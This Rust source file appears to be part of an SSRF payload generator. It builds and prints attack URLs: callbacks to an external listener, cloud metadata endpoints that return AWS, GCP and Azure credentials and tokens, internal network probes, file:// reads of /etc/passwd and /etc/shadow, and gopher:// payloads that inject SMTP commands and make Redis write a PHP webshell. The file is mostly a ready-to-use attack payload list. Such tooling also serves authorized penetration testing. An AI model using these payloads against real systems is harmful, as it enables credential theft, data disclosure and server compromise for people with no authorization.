use colored::Colorize;

pub struct Payload {
    pub name: String,
    pub url: String,
    pub description: String,
    pub category: PayloadCategory,
}

#[derive(Clone, Copy, PartialEq, Eq)]
pub enum PayloadCategory {
    Callback,
    AwsMetadata,
    GcpMetadata,
    AzureMetadata,
    InternalScan,
    ProtocolSmuggle,
    Custom,
}

pub fn generate_payloads(
    external_ip: &str,
    callback_port: u16,
    cloud: &str,
    smuggle: bool,
    custom: Option<&str>,
) -> Vec<Payload> {
    let mut payloads = Vec::new();
    let callback_id = rand_id();
    let callback_url = format!("http://{}:{}/{}", external_ip, callback_port, callback_id);

    // 1. Basic callback — always include to detect basic SSRF
    payloads.push(Payload {
        name: "Basic callback".to_string(),
        url: callback_url.clone(),
        description: "Simple HTTP callback to verify SSRF exists".to_string(),
        category: PayloadCategory::Callback,
    });

    let cloud_lower = cloud.to_lowercase();

    // 2. AWS metadata endpoints
    if cloud_lower == "all" || cloud_lower == "aws" {
        payloads.push(Payload {
            name: "AWS IMDSv1 — IAM role".to_string(),
            url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/".to_string(),
            description: "AWS Instance Metadata Service v1 — list IAM roles".to_string(),
            category: PayloadCategory::AwsMetadata,
        });
        payloads.push(Payload {
            name: "AWS IMDSv1 — user-data".to_string(),
            url: "http://169.254.169.254/latest/user-data".to_string(),
            description: "AWS user-data script (may contain secrets)".to_string(),
            category: PayloadCategory::AwsMetadata,
        });
        payloads.push(Payload {
            name: "AWS IMDSv2 — token (needs headers)".to_string(),
            url: "http://169.254.169.254/latest/api/token".to_string(),
            description: "AWS IMDSv2 — requires X-aws-ec2-metadata-token header".to_string(),
            category: PayloadCategory::AwsMetadata,
        });
        payloads.push(Payload {
            name: "AWS — local metadata (fd00:ec2::254)".to_string(),
            url: "http://[fd00:ec2::254]/latest/meta-data/".to_string(),
            description: "AWS IPv6 metadata endpoint (bypasses IMDSv2 in some cases)".to_string(),
            category: PayloadCategory::AwsMetadata,
        });
    }

    // 3. GCP metadata endpoints
    if cloud_lower == "all" || cloud_lower == "gcp" {
        payloads.push(Payload {
            name: "GCP — access token".to_string(),
            url: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token".to_string(),
            description: "GCP service account access token (needs Metadata-Flavor: Google header)".to_string(),
            category: PayloadCategory::GcpMetadata,
        });
        payloads.push(Payload {
            name: "GCP — project metadata".to_string(),
            url: "http://metadata.google.internal/computeMetadata/v1/project/".to_string(),
            description: "GCP project metadata (may contain secrets)".to_string(),
            category: PayloadCategory::GcpMetadata,
        });
        payloads.push(Payload {
            name: "GCP — instance attributes".to_string(),
            url: "http://metadata.google.internal/computeMetadata/v1/instance/attributes/".to_string(),
            description: "GCP instance attributes (startup scripts, custom metadata)".to_string(),
            category: PayloadCategory::GcpMetadata,
        });
    }

    // 4. Azure metadata endpoints
    if cloud_lower == "all" || cloud_lower == "azure" {
        payloads.push(Payload {
            name: "Azure — instance metadata".to_string(),
            url: "http://169.254.169.254/metadata/instance?api-version=2021-02-01".to_string(),
            description: "Azure instance metadata (needs Metadata: true header)".to_string(),
            category: PayloadCategory::AzureMetadata,
        });
        payloads.push(Payload {
            name: "Azure — access token".to_string(),
            url: "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/".to_string(),
            description: "Azure managed identity access token".to_string(),
            category: PayloadCategory::AzureMetadata,
        });
    }

    // 5. Internal network scanning
    payloads.push(Payload {
        name: "Internal — localhost".to_string(),
        url: "http://127.0.0.1/".to_string(),
        description: "Test if server can reach itself".to_string(),
        category: PayloadCategory::InternalScan,
    });
    payloads.push(Payload {
        name: "Internal — localhost alt".to_string(),
        url: "http://localhost/".to_string(),
        description: "Test if server can reach itself (hostname)".to_string(),
        category: PayloadCategory::InternalScan,
    });
    payloads.push(Payload {
        name: "Internal — private 10.x".to_string(),
        url: "http://10.0.0.1/".to_string(),
        description: "Test access to internal 10.0.0.0/8 network".to_string(),
        category: PayloadCategory::InternalScan,
    });
    payloads.push(Payload {
        name: "Internal — private 192.168.x".to_string(),
        url: "http://192.168.1.1/".to_string(),
        description: "Test access to internal 192.168.0.0/16 network".to_string(),
        category: PayloadCategory::InternalScan,
    });

    // 6. Protocol smuggling
    if smuggle {
        payloads.push(Payload {
            name: "Smuggle — file:///etc/passwd".to_string(),
            url: "file:///etc/passwd".to_string(),
            description: "Read local files via file:// protocol".to_string(),
            category: PayloadCategory::ProtocolSmuggle,
        });
        payloads.push(Payload {
            name: "Smuggle — file:///etc/shadow".to_string(),
            url: "file:///etc/shadow".to_string(),
            description: "Read shadow file via file:// protocol".to_string(),
            category: PayloadCategory::ProtocolSmuggle,
        });
        payloads.push(Payload {
            name: "Smuggle — gopher:// SMTP".to_string(),
            url: format!("gopher://127.0.0.1:25/_HELO%20localhost%0AMAIL%20FROM:<test@test.com>%0ARCPT%20TO:<root@localhost>%0ADATA%0ASubject:%20SSRF%0ATest%0A.%0AQUIT%0A"),
            description: "Send email via SMTP using gopher:// protocol".to_string(),
            category: PayloadCategory::ProtocolSmuggle,
        });
        payloads.push(Payload {
            name: "Smuggle — gopher:// Redis".to_string(),
            url: format!("gopher://127.0.0.1:6379/_FLUSHALL%0ASET%20foo%20bar%0ACONFIG%20SET%20dir%20/var/www%0ACONFIG%20SET%20dbfilename%20shell.php%0ASAVE%0A"),
            description: "Write webshell via Redis using gopher:// protocol".to_string(),
            category: PayloadCategory::ProtocolSmuggle,
        });
        payloads.push(Payload {
            name: "Smuggle — dict://".to_string(),
            url: "dict://127.0.0.1:11211/stats".to_string(),
            description: "Query Memcached stats via dict:// protocol".to_string(),
            category: PayloadCategory::ProtocolSmuggle,
        });
    }

    // 7. Custom payload
    if let Some(custom_url) = custom {
        payloads.push(Payload {
            name: "Custom payload".to_string(),
            url: custom_url.to_string(),
            description: "User-provided custom payload".to_string(),
            category: PayloadCategory::Custom,
        });
    }

    payloads
}

pub fn print_payloads(payloads: &[Payload]) {
    println!("{} Generated {} SSRF payloads:", "[*]".cyan().bold(), payloads.len());
    println!("{}", "─".repeat(60).dimmed());

    let mut current_cat = "";
    for p in payloads {
        let cat_str = match p.category {
            PayloadCategory::Callback => "CALLBACK",
            PayloadCategory::AwsMetadata => "AWS METADATA",
            PayloadCategory::GcpMetadata => "GCP METADATA",
            PayloadCategory::AzureMetadata => "AZURE METADATA",
            PayloadCategory::InternalScan => "INTERNAL SCAN",
            PayloadCategory::ProtocolSmuggle => "PROTOCOL SMUGGLE",
            PayloadCategory::Custom => "CUSTOM",
        };

        if cat_str != current_cat {
            println!("\n{} {}", "■".cyan(), cat_str.white().bold());
            current_cat = cat_str;
        }

        println!("  {} {}", "•".cyan(), p.name.white());
        println!("    {} {}", "URL:".dimmed(), p.url.green());
        println!("    {} {}", "Desc:".dimmed(), p.description.dimmed());
    }
    println!();
}

fn rand_id() -> String {
    use rand::Rng;
    let mut rng = rand::thread_rng();
    (0..8)
        .map(|_| {
            let idx: usize = rng.gen_range(0..36);
            if idx < 10 {
                char::from_digit(idx as u32, 10).unwrap()
            } else {
                ((idx - 10) as u8 + b'a') as char
            }
        })
        .collect::<String>()
}
